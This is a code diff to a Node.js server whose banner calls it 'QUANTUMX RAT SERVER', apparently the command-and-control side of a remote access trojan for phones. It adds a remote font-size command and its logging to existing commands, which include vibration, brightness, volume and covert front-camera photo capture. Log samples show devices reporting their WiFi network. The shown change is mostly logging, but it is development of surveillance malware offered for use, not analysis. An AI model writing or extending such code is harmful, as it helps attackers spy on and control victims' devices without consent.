@@ -155,6 +155,8 @@ app.post('/api/device/:deviceId/command', authenticateToken, (req, res) => {
         console.log(`🔆 [BRIGHTNESS] SETTING -> ${deviceName} (${deviceId}) | LEVEL: ${params?.level || 50}%`);
     } else if (command === 'volume') {
         console.log(`🔊 [VOLUME] SETTING -> ${deviceName} (${deviceId}) | LEVEL: ${params?.level || 50}% | TYPE: ${params?.type || 'music'}`);
+    } else if (command === 'fontsize') {
+        console.log(`📏 [FONT SIZE] SETTING -> ${deviceName} (${deviceId}) | SCALE: ${params?.scale || 100}%`);
     }
     
     res.json({ success: true, commandId, message: 'Command sent' });
@@ -215,6 +217,12 @@ app.post('/api/device/command/result', (req, res) => {
                 console.log(`✅ [VOLUME] SUCCESS -> ${deviceName} | LEVEL: ${result?.level}% | TYPE: ${result?.type || 'music'}`);
             } else {
                 console.log(`❌ [VOLUME] FAILED -> ${deviceName}`);
+            }
+        } else if (deviceCommands[commandIndex].command === 'fontsize') {
+            if (status === 'completed') {
+                console.log(`✅ [FONT SIZE] SUCCESS -> ${deviceName} | SCALE: ${result?.scale}%`);
+            } else {
+                console.log(`❌ [FONT SIZE] FAILED -> ${deviceName}`);
             }
         }
     }
@@ -408,7 +416,7 @@ const PORT = process.env.PORT || 3000;
 server.listen(PORT, () => {
     console.log(`
 ╔══════════════════════════════════════════════════════════════╗
-║              QUANTUMX RAT SERVER v5.0 - FINAL                ║
+║              QUANTUMX RAT SERVER v6.0 - FINAL                ║
 ╠══════════════════════════════════════════════════════════════╣
 ║  RUNNING ON PORT: ${PORT}                                                ║
 ║  WEBSOCKET: ws://localhost:${PORT}                                       ║
@@ -420,6 +428,7 @@ server.listen(PORT, () => {
 ║  📳 VIBRATE    - Getar perangkat                             ║
 ║  🔆 BRIGHTNESS - Atur kecerahan layar                        ║
 ║  🔊 VOLUME     - Atur volume media                           ║
+║  📏 FONT SIZE  - Atur ukuran font sistem                     ║
 ║  📷 CAMERA     - Ambil foto kamera depan                     ║
 ╠══════════════════════════════════════════════════════════════╣
 ║                      LOG FORMAT                                ║
@@ -432,6 +441,8 @@ server.listen(PORT, () => {
 ║  ✅ [BRIGHTNESS] SUCCESS -> Device | LEVEL: 75%              ║
 ║  🔊 [VOLUME] SETTING -> Device | LEVEL: 50% | TYPE: music    ║
 ║  ✅ [VOLUME] SUCCESS -> Device | LEVEL: 50% | TYPE: music    ║
+║  📏 [FONT SIZE] SETTING -> Device | SCALE: 100%              ║
+║  ✅ [FONT SIZE] SUCCESS -> Device | SCALE: 100%              ║
 ║  📷 [CAMERA] CAPTURING -> Device                              ║
 ║  ✅ [CAMERA] SUCCESS -> Device | PHOTO TAKEN                  ║
 ║  📱 [DEVICE] ONLINE -> Device | NETWORK: WiFi SSID            ║
